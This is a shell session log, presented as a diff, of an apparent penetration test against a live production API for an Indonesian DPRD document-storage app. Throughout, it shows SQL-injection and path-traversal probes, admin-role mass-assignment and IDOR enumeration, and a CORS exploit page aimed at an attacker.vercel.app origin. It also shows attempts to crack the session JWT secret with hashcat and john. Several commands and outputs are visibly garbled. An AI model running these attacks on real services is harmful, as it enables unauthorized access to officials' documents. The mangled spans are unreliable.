@@ -1,0 +1,3037 @@
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# Register + login fresh
+USER="uuid$(date +%s)"
+EMAIL="$USER@example.com"
+PASS="Pentest123AAaa"
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" -o api/reg.json
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" -o api/login.json
+TOKEN=$(jq -r 'if type=="array" then .[0].access_token else .access_token end' api/login.json)
+MY_ID=$(jq -r 'if type=="array" then .[0].user.id else .user.id end' api/login.json)
+AUTH="Authorization: Bearer $TOKEN"
+echo "$TOKEN" > api/token.txt
+echo "My UUID: $MY_ID"
+
+# Upload file → dapat file UUID
+echo "=== Upload test file ==="
+echo "Test content $(date)" > /tmp/pentest.txt
+curl -sS -X POST "$BE/files/upload" \
+  -H "$AUTH" -F "file=@/tmp/pentest.txt" \
+  -o api/upload-result.json -w '[%{http_code}]\n'
+cat api/upload-result.json | jq .
+
+# Extract UUID dari hasil upload
+FILE_UUID=$(jq -r '.file_id // .id // .file.id // .uuid // empty' api/upload-result.json)
+echo "File UUID: $FILE_UUID"
+
+# List semua file
+echo "=== List files ==="
+curl -sS -H "$AUTH" "$BE/files/" | jq .
+My UUID: c7a9d5a9-7e0d-4299-affe-7587b96c97f4
+=== Upload test file ===
+[400]
+{
+  "detail": "Belum ada akun Google Drive aktif. Connect ulang di menu 'Google Drive'."
+}
+File UUID: 
+=== List files ===
+[]
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+AUTH="Authorization: Bearer $TOKEN"
+FILE_UUID=$(jq -r '.file_id // .id // empty' api/upload-result.json)
+
+if [ -n "$FILE_UUID" ]; then
+  echo "=== Test /docs/$FILE_UUID ==="
+  curl -sS -H "$AUTH" "$BE/docs/$FILE_UUID" -w '\n[%{http_code}]\n' | tee api/docs-test.json
+  curl -sS -H "$AUTH" "$BE/docs/$FILE_UUID/raw" -o api/docs-raw.bin -w '[%{http_code}] %{size_download} bytes\n'
+  curl -sS -H "$AUTH" "$BE/files/$FILE_UUID/download" -o api/download.bin -w '[%{http_code}] %{size_download} bytes\n'
+  curl -sS -H "$AUTH" "$BE/files/$FILE_UUID/preview" -o api/preview.bin -w '[%{http_code}] %{size_download} bytes\n'
+fi
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+AUTH="Authorization: Bearer $TOKEN"
+FILE_UUID=$(jq -r '.file_id // .id // empty' api/upload-result.json)
+
+# Buat share dari file kita
+echo "=== Create share ==="
+curl -sS -X POST "$BE/share/create" -H "$AUTH" -H "Content-Type: application/json" \
+  -d "{\"file_id\":\"$FILE_UUID\"}" -w '\n[%{http_code}]\n' | tee api/share-create.json
+
+# Extract share token
+SHARE_TOKEN=$(jq -r '.token // .share_token // .id // empty' api/share-create.json 2>/dev/null)
+echo "Share token: $SHARE_TOKEN"
+
+# Test share endpoint dengan token valid
+if [ -n "$SHARE_TOKEN" ]; then
+  echo "=== Test /share/$SHARE_TOKEN/info ==="
+  curl -sS "$BE/share/$SHARE_TOKEN/info" -w '\n[%{http_code}]\n'
+  curl -sS "$BE/share/$SHARE_TOKEN/download" -o api/share-download.bin -w '[%{http_code}] %{size_download} bytes\n'
+  curl -sS "$BE/share/$SHARE_TOKEN/preview" -o api/share-preview.bin -w '[%{http_code}] %{size_download} bytes\n'
+fi
+=== Create share ===
+{"detail":"Internal server error"}
+[500]
+Share token: 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS -D - -o /dev/null -X POST "$BE/auth/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'$EMAIL'","password":"'$PASS'"}' | grep -i set-cookie
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+AUTH="Authorization: Bearer $TOKEN"
+
+curl -sS -H "$AUTH" "$BE/collaborators/" | jq .
+curl -sS -H "$AUTH" "$BE/drives/" | jq .
+curl -sS -H "$AUTH" "$BE/drives/pool" | jq .
+curl -sS -H "$AUTH" "$BE/assignments/my" | jq .
+[]
+[]
+{
+  "total": 0,
+  "used": 0,
+  "free": 0,
+  "accounts": 0
+}
+[]
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ for test_id in "test" "00000000-0000-0000-0000-000000000000" "1"; do
+  echo "=== share file_id=$test_id ==="
+  curl -sS -X POST "$BE/share/create" -H "$AUTH" -H "Content-Type: application/json" \
+    -d "{\"file_id\":\"$test_id\"}" -w '\n[%{http_code}]\n'
+done
+=== share file_id=test ===
+{"detail":"Internal server error"}
+[500]
+=== share file_id=00000000-0000-0000-0000-000000000000 ===
+{"detail":"Internal server error"}
+[500]
+=== share file_id=1 ===
+{"detail":"Internal server error"}
+[500]
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ curl -sS -H "$AUTH" "$BE/files/" | jq '.files // .items // .'
+jq: error (at <stdin>:0): Cannot index array with string "files"
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # Timing beda antara UUID valid vs invalid
+for id in "00000000-0000-0000-0000-000000000000" "1"; do
+  t0=$(date +%s%N)
+  curl -sS -H "$AUTH" "$BE/docs/$id" -o /dev/null
+  t1=$(date +%s%N)
+  echo "  $id → $(( (t1-t0)/1000000 ))ms"
+done
+  00000000-0000-0000-0000-000000000000 → 2495ms
+  1 → 2250ms
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # UUID v4 random — kalau ada user → 200, kalau tidak → 404/500
+for uuid in \
+  "00000000-0000-0000-0000-000000000000" \
+  "11111111-1111-1111-1111-111111111111" \
+  "$MY_ID"; do
+  echo -n "  $uuid → "
+  curl -sS -o /tmp/r -w '%{http_code} ' -H "$AUTH" "$BE/assignments/user/$uuid"
+  head -c 100 /tmp/r; echo
+done
+  00000000-0000-0000-0000-000000000000 → 500 {"detail":"Internal server error"}
+  11111111-1111-1111-1111-111111111111 → 500 {"detail":"Internal server error"}
+  c7a9d5a9-7e0d-4299-affe-7587b96c97f4 → 500 {"detail":"Internal server error"}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+
+# Register + login fresh
+USER="cookie$(date +%s)"
+EMAIL="$USER@example.com"
+PASS="Pentest123AAaa"
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" -o /dev/null
+
+echo "=== Set-Cookie header saat login ==="
+curl -sS -D - -o /dev/null -X POST "$BE/auth/login" \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
+  | grep -i 'set-cookie'
+
+
+=== Set-Cookie header saat login ===
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt)
+AUTH="Authorization: Bearer $TOKEN"
+
+echo "=== UUID cast injection test ==="
+for payload in \
+  "00000000-0000-0000-0000-000000000000" \
+  "' OR '1'='1" \
+  "1'::uuid OR 1=1--" \
+  "00000000-0000-0000-0000-000000000000' OR '1'='1" \
+  "00000000-0000-0000-0000-000000000000%27" \
+  "%00" \
+  "00000000-0000-0000-0000-000000000000' UNION SELECT NULL--"; do
+  enc=$(printf '%s' "$payload" | jq -sRr @uri)
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' -H "$AUTH" "$BE/docs/$enc")
+  body=$(head -c 150 /tmp/r | tr '\n' ' ')
+  printf '  payload=%-50s → %s | %s\n' "$payload" "$code" "$body"
+done | tee api/sqli-probe.txt
+=== UUID cast injection test ===
+  payload=00000000-0000-0000-0000-000000000000               → 500 | {"detail":"Gagal buka dokumen: {'message': 'Cannot coerce the result to a single JSON object', 'code': 'PGRST116', 'hint': None, 'details': 'The resul
+
+
+  payload=' OR '1'='1                                        → 500 | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: \"\\' OR \\'1\\'=\\'1\"', 'code': '22P02', 'hint': None, 'details': No
+  payload=1'::uuid OR 1=1--                                  → 500 | {"detail":"Gagal buka dokumen: {'message': 'Forbidden', 'code': '403', 'hint': None, 'details': '<!DOCTYPE html>\\n<!--[if lt IE 7]> <html class=\"no-
+  payload=00000000-0000-0000-0000-000000000000' OR '1'='1    → 500 | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: \"00000000-0000-0000-0000-000000000000\\' OR \\'1\\'=\\'1\"', 'code': 
+  payload=00000000-0000-0000-0000-000000000000%27            → 500 | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: \"00000000-0000-0000-0000-000000000000%27\"', 'code': '22P02', 'hint':
+  payload=%00                                                → 500 | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: \"%00\"', 'code': '22P02', 'hint': None, 'details': None}"}
+  payload=00000000-0000-0000-0000-000000000000' UNION SELECT NULL-- → 500 | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: \"00000000-0000-0000-0000-000000000000\\' UNION SELECT NULL--\"', 'cod
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ # 1. Jalankan server lokal
+cd ~/Documents/attack-vercel
+python3 -m http.server 3000 &
+
+# 2. Jalankan Chrome dengan flag bypass CORS
+google-chrome --disable-web-security \
+  --user-data-dir=/tmp/chrome-cors-test \
+  --disable-site-isolation-trials \
+  http://localhost:3000 &
+[1] 64453
+[2] 64454
+pathoskratos@pathos:~/Documents/attack-vercel$ Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
+google-chrome: command not found
+127.0.0.1 - - [05/Nov/2026 11:15:06] "GET / HTTP/1.1" 304 -
+127.0.0.1 - - [05/Nov/2026 11:15:09] "GET / HTTP/1.1" 304 -
+^C
+[2]+  Exit 127                google-chrome --disable-web-security --user-data-dir=/tmp/chrome-cors-test --disable-site-isolation-trials http://localhost:3000
+pathoskratos@pathos:~/Documents/attack-vercel$ BE="https://web-production-c8591.up.railway.app"
+
+# Bukti 1: header reflect
+curl -sS -D - -o /dev/null -H "Origin: https://attacker.vercel.app" "$BE/health" \
+  | grep -i access-control
+
+# Bukti 2: dengan token (simulasi user login)
+curl -sS -D - -H "Origin: https://attacker.vercel.app" \
+  -H "Authorization: Bearer $TOKEN" "$BE/categories/" \
+  | head -20
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+HTTP/2 200 
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+content-type: application/json
+date: Thu, 05 Nov 2026 04:15:59 GMT
+server: railway-hikari
+vary: Origin
+vary: accept-encoding
+x-railway-request-id: Cvz6ECNDTf2576qHHn5Ytg
+content-length: 1543
+x-hikari-trace: sin1.462z
+x-railway-edge: sin1
+
+{"default":[{"id":"default-Surat Masuk","name":"Surat Masuk","icon":"📨","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Surat Keluar","name":"Surat Keluar","icon":"📤","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-BA (Berita Acara)","name":"BA (Berita Acara)","icon":"📋","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Surat Keputusan Pimpinan","name":"Surat Keputusan Pimpinan","icon":"⚖️","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Surat Keputusan DPRD","name":"Surat Keputusan DPRD","icon":"🏛️","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Surat Persetujuan Bersama","name":"Surat Persetujuan Bersama","icon":"🤝","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-SPJ (Surat Pertanggungjawaban)","name":"SPJ (Surat Pertanggungjawaban)","icon":"💰","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Notulen Banmus","name":"Notulen Banmus","icon":"📝","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Notulen Bapemperda","name":"Notulen Bapemperda","icon":"📝","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Notulen Pansus","name":"Notulen Pansus","icon":"📝","color":"#6366f1","keywords":[],"is_default":true}],"custom":[],"all":["Surat Masuk","Surat Keluar","BA (Berita Acara)","Surat Keputusan Pimpinan","Surat Keputusan DPRD","Surat Persetujuan Bersama","SPJ (Surat Pertanggungjawaban)","Notulen Banmus","Notulen Bapemperda","Notulen Pansupathoskratos@pathos:~/Documents/attack-vercel$ cd ~/Documents/attack-vercelrcel
+python3 -m http.server 3000
+# Buka http://localhost:3000
+# Klik "Test dengan Token Manual" → paste JWT
+Traceback (most recent call last):
+  File "<frozen runpy>", line 198, in _run_module_as_main
+  File "<frozen runpy>", line 88, in _run_code
+  File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
+    test(
+  File "/usr/lib/python3.12/http/server.py", line 1261, in test
+    with ServerClass(addr, HandlerClass) as httpd:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socketserver.py", line 457, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
+    return super().server_bind()
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+pathoskratos@pathos:~/Documents/attack-vercel$ cd ~/Documents/attack-vercel
+
+# Jalankan server
+python3 -m http.server 3000 &
+
+# Buka di browser (manual)
+# 1. http://localhost:3000
+# 2. Klik "Test dengan Token Manual"
+# 3. Paste token dari: cat ~/Documents/audit-clouddatadprd/api/token.txt
+# 4. Screenshot hasilnya
+[2] 64525
+pathoskratos@pathos:~/Documents/attack-vercel$ Traceback (most recent call last):
+  File "<frozen runpy>", line 198, in _run_module_as_main
+  File "<frozen runpy>", line 88, in _run_code
+  File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
+    test(
+  File "/usr/lib/python3.12/http/server.py", line 1261, in test
+    with ServerClass(addr, HandlerClass) as httpd:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socketserver.py", line 457, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
+    return super().server_bind()
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+
+[2]+  Exit 1                  python3 -m http.server 3000
+pathoskratos@pathos:~/Documents/attack-vercel$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# Register + login fresh
+USER="poc$(date +%s)"
+EMAIL="$USER@example.com"
+PASS="Pentest123AAaa"
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" -o /dev/null
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" -o api/login-poc.json
+
+TOKEN=$(jq -r 'if type=="array" then .[0].access_token else .access_token end' api/login-poc.json)
+AUTH="Authorization: Bearer $TOKEN"
+
+# ============================================================================
+# BUKTI 1: CORS reflect di /health (tanpa auth)
+# ============================================================================
+echo "═══════════ BUKTI 1: CORS reflect di /health ═══════════"
+curl -sS -D - -o /dev/null \
+  -H "Origin: https://attacker.vercel.app" \
+  "$BE/health" \
+  | tee api/POC-cors-health.txt
+echo
+
+# ============================================================================
+# BUKTI 2: CORS + credentials + data user (dengan auth)
+# ============================================================================
+echo "═══════════ BUKTI 2: CORS + auth + data leak ═══════════"
+curl -sS -D api/POC-cors-categories-headers.txt \
+  -H "Origin: https://attacker.vercel.app" \
+  -H "$AUTH" \
+  "$BE/categories/" \
+  | jq . | tee api/POC-error-leak.json-0000-0000-0000-000000000000" \"========s-body.json 2>/dev/null
+═══════════ BUKTI 1: CORS reflect di /health ═══════════
+HTTP/2 200 
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+content-type: application/json
+date: Thu, 05 Nov 2026 04:16:52 GMT
+server: railway-hikari
+vary: Origin
+x-railway-request-id: tFfgZvh5QfC6FZTlqmzx2A
+content-length: 20
+x-hikari-trace: sin1.hs0s
+x-railway-edge: sin1
+
+
+═══════════ BUKTI 2: CORS + auth + data leak ═══════════
+── Headers ──
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code, Content-Disposition, Content-Length
+── Body (data user) ──
+Surat Masuk
+{"default":[{"id":"default-Surat Masuk","name":"Surat Masuk","icon":"📨","color":"#6366f1","keywords":[],"is_default":true},{"id":"default-Surat Keluar","name":"Surat Keluar","icon":"📤","color":"
+
+═══════════ BUKTI 3: /cors-check bocorkan whitelist ═══════════
+{
+  "received_origin": null,
+  "allowed_origins": [
+    "https://clouddatadprd.vercel.app",
+    "https://www.clouddatadprd.vercel.app",
+    "http://localhost:3000",
+    "http://localhost:3001",
+    "http://127.0.0.1:3000",
+    "http://127.0.0.1:3001"
+  ],
+  "allowed_regex": [
+    "https://.*\\.vercel\\.app",
+    "https://.*clouddatadprd.*\\.vercel\\.app"
+  ]
+}
+
+═══════════ BUKTI 4: OpenAPI exposed ═══════════
+/openapi.json   → 200 (40129 bytes)
+/docs           → 200 (1009 bytes)
+/redoc          → 200 (891 bytes)
+
+═══════════ BUKTI 5: Error leak PostgreSQL/Supabase ═══════════
+{
+  "detail": "Gagal buka dokumen: {'message': 'Cannot coerce the result to a single JSON object', 'code': 'PGRST116', 'hint': None, 'details': 'The result contains 0 rows'}"
+}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ mkdir -p ~/Documents/attack-vercel && cd ~/Documents/attack-vercel
+
+cat > index.html <<'HTMLEOF'
+<!DOCTYPE html>
+<html>
+<head>
+  <title>YuditCloud PoC</title>
+  <style>body{font-family:monospace;padding:20px;background:#111;color:#0f0}pre{white-space:pre-wrap;word-break:break-all}</style>
+</head>
+<body>
+<h1>CORS Exploit — YuditCloud</h1>
+<p>Status: <span id="s">running...</span></p>
+<p>My origin: <code id="origin"></code></p>
+<pre id="out"></pre>
+
+<script>
+const BE = 'https://web-production-c8591.up.railway.app';
+document.getElementById('origin').textContent = location.origin;
+
+const endpoints = [
+  '/categories/',
+  '/files/categories',
+  '/files/stats',
+  '/files/monthly-folders',
+  '/notifications/health',
+  '/drives/pool',
+  '/assignments/my',
+  '/collaborators/',
+  '/conversions/jobs'
+];
+
+(async () => {
+  const results = [];
+  for (const ep of endpoints) {
+HTMLEOFt>h(()=>{});ngify(results)R-UUID-HERE', {SON.stringify(results, null, 2);
+pathoskratos@pathos:~/Documents/attack-vercel$ cd ~/Documents/attack-vercel
+python3 -m http.server 3000
+# Buka http://localhost:3000 di browser
+# Login ke clouddatadprd di tab lain dulu
+Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
+127.0.0.1 - - [05/Nov/2026 11:06:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [05/Nov/2026 11:06:10] code 404, message File not found
+127.0.0.1 - - [05/Nov/2026 11:06:10] "GET /favicon.ico HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+pathoskratos@pathos:~/Documents/attack-vercel$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# 1. Register dengan role=admin + capture response
+USER="maadmin$(date +%s)"
+EMAIL="$USER@example.com"
+PASS="Pentest123AAaa"
+BODY="{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\",\"role\":\"admin\",\"is_admin\":true,\"is_superuser\":true,\"plan\":\"enterprise\"}"
+
+echo "=== Register dengan role=admin ==="
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "$BODY" -w '\n[%{http_code}]\n' -o api/reg-admin.json
+cat api/reg-admin.json | jq '.user' 2>/dev/null
+
+# 2. Login dengan akun itu, lihat role
+echo "=== Login ==="
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" -o api/login-admin.json
+cat api/login-admin.json | jq '.user'
+
+# 3. Cek role — kalau "admin" → MASS ASSIGNMENT CONFIRMED
+ROLE=$(jq -r '.user.role' api/login-admin.json)
+echo "=== Role user: $ROLE ==="
+if [ "$ROLE" = "admin" ] || [ "$ROLE" = "superadmin" ]; then
+  echo "🔴 CRITICAL: Mass assignment berhasil! Role = $ROLE"
+else
+  echo "ℹ️ Role tetap: $ROLE (field diabaikan server)"
+fi
+=== Register dengan role=admin ===
+
+[200]
+{
+  "id": "a271d7f1-a787-4b27-bb96-cf38cee861d8",
+  "email": "maadmin1793784314@example.com",
+  "username": "maadmin1793784314",
+  "role": "owner",
+  "owner_id": null,
+  "must_change_password": false,
+  "is_active": true
+}
+=== Login ===
+{
+  "id": "a271d7f1-a787-4b27-bb96-cf38cee861d8",
+  "email": "maadmin1793784314@example.com",
+  "username": "maadmin1793784314",
+  "role": "owner",
+  "owner_id": null,
+  "must_change_password": false,
+  "is_active": true
+}
+=== Role user: owner ===
+ℹ️ Role tetap: owner (field diabaikan server)
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# Register + login fresh
+USER="idor$(date +%s)"
+EMAIL="$USER@example.com"
+PASS="Pentest123AAaa"
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"username\":\"$USER\",\"password\":\"$PASS\"}" \
+  -o api/reg.json
+
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" -o api/login.json
+
+# jq handle array OR object
+TOKEN=$(jq -r 'if type=="array" then .[0].access_token else .access_token end' api/login.json)
+echo "Token len: ${#TOKEN}"
+echo "$TOKEN" > api/token.txt
+
+AUTH="Authorization: Bearer $TOKEN"
+MY_ID=$(jq -r 'if type=="array" then .[0].user.id else .user.id end' api/login.json)
+echo "My ID: $MY_ID"
+
+# === Test GET IDOR pada endpoint yang benar-benar ada ===
+echo
+echo "=== GET IDOR tests ==="
+# /files/{id}/download, /files/{id}/preview (GET bukan DELETE)
+for ep in \
+  "/files/1/download" "/files/2/download" "/files/3/download" \
+  "/files/1/preview" "/files/2/preview" "/files/3/preview" \
+  "/docs/1" "/docs/2" "/docs/3" \
+  "/docs/1/raw" "/docs/1/versions" "/docs/1/google-doc-info" \
+  "/folders/1" "/folders/2" \
+done | tee api/idor-real.txtes) | %s\n' "$ep" "$code" "$size" "$preview"
+Token len: 165
+My ID: 4a9fb1b1-32db-4e58-b67b-986916facc5d
+
+=== GET IDOR tests ===
+/files/1/download                        → 500 (34 bytes) | {"detail":"Internal server error"}
+
+
+/files/2/download                        → 500 (34 bytes) | {"detail":"Internal server error"}
+
+
+
+
+
+
+
+/files/3/download                        → 500 (34 bytes) | {"detail":"Internal server error"}
+/files/1/preview                         → 500 (34 bytes) | {"detail":"Internal server error"}
+/files/2/preview                         → 500 (34 bytes) | {"detail":"Internal server error"}
+/files/3/preview                         → 500 (34 bytes) | {"detail":"Internal server error"}
+/docs/1                                  → 500 (137 bytes) | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: 
+/docs/2                                  → 500 (137 bytes) | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: 
+/docs/3                                  → 500 (137 bytes) | {"detail":"Gagal buka dokumen: {'message': 'invalid input syntax for type uuid: 
+/docs/1/raw                              → 500 (34 bytes) | {"detail":"Internal server error"}
+/docs/1/versions                         → 500 (34 bytes) | {"detail":"Internal server error"}
+/docs/1/google-doc-info                  → 500 (34 bytes) | {"detail":"Internal server error"}
+/folders/1                               → 405 (31 bytes) | {"detail":"Method Not Allowed"}
+/folders/2                               → 405 (31 bytes) | {"detail":"Method Not Allowed"}
+/drives/1                                → 405 (31 bytes) | {"detail":"Method Not Allowed"}
+/drives/2                                → 405 (31 bytes) | {"detail":"Method Not Allowed"}
+/assignments/file/1                      → 500 (34 bytes) | {"detail":"Internal server error"}
+/assignments/file/2                      → 500 (34 bytes) | {"detail":"Internal server error"}
+/assignments/user/4a9fb1b1-32db-4e58-b67b-986916facc5d → 500 (34 bytes) | {"detail":"Internal server error"}
+/conversions/files/1/lineage             → 500 (34 bytes) | {"detail":"Internal server error"}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+
+echo "=== SQLi / type confusion pada token ==="
+for t in "1" "1'" "1 OR 1=1" "1' OR '1'='1" "1;DROP TABLE" "abc" "1.5" "-1" "null" "undefined" "00000000-0000-0000-0000-000000000000"; do
+  enc=$(printf '%s' "$t" | jq -sRr @uri)
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' "$BE/share/$enc/info")
+  body=$(head -c 100 /tmp/r | tr '\n' ' ')
+  printf '  token=%-45s → %s | %s\n' "$t" "$code" "$body"
+done | tee api/share-500-probe.txt
+
+echo
+echo "=== Coba dengan header/format berbeda ==="
+# Cek respons verbose
+curl -sS -v "$BE/share/1/info" 2>&1 | grep -E '< HTTP|< |^>' | head -20
+=== SQLi / type confusion pada token ===
+  token=1                                             → 500 | {"detail":"Internal server error"}
+  token=1'                                            → 500 | {"detail":"Internal server error"}
+  token=1 OR 1=1                                      → 500 | {"detail":"Internal server error"}
+  token=1' OR '1'='1                                  → 500 | {"detail":"Internal server error"}
+  token=1;DROP TABLE                                  → 500 | {"detail":"Internal server error"}
+  token=abc                                           → 500 | {"detail":"Internal server error"}
+  token=1.5                                           → 500 | {"detail":"Internal server error"}
+  token=-1                                            → 500 | {"detail":"Internal server error"}
+  token=null                                          → 500 | {"detail":"Internal server error"}
+  token=undefined                                     → 500 | {"detail":"Internal server error"}
+  token=00000000-0000-0000-0000-000000000000          → 500 | {"detail":"Internal server error"}
+
+=== Coba dengan header/format berbeda ===
+> GET /share/1/info HTTP/2
+> Host: web-production-c8591.up.railway.app
+> User-Agent: curl/8.5.0
+> Accept: */*
+> 
+< HTTP/2 500 
+< content-type: application/json
+< date: Wed, 04 Nov 2026 09:26:13 GMT
+< server: railway-hikari
+< x-railway-request-id: wr3Cy2nxRp2bXsiAFFmdQQ
+< content-length: 34
+< x-hikari-trace: sin1.tr00
+< x-railway-edge: sin1
+< 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ for t in "1/" "1%00" "1?password=x" "1/../../etc/passwd"; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' "$BE/share/$t/info")
+  echo "  /share/$t/info → $code"
+done
+  /share/1//info → 404
+  /share/1%00/info → 500
+  /share/1?password=x/info → 405
+  /share/1/../../etc/passwd/info → 404
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+cd ~/Documents/audit-clouddatadprd
+TOKEN=$(cat api/token.txt)
+
+# Install jwt_tool atau pakai hashcat
+command -v jwt_tool || pipx install jwt-tool
+
+# Crack HS256 secret dengan wordlist umum
+echo "$TOKEN" > api/jwt.txt
+hashcat -m 16500 -a 0 api/jwt.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt --quiet 2>/dev/null
+
+# Atau pakai jwt_tool
+jwt_tool "$TOKEN" -C -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 2>/dev/null
+
+# Atau pakai john
+john --format=HMAC-SHA256 --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt api/jwt.txt
+Fatal error from pip prevented installation. Full pip output in file:
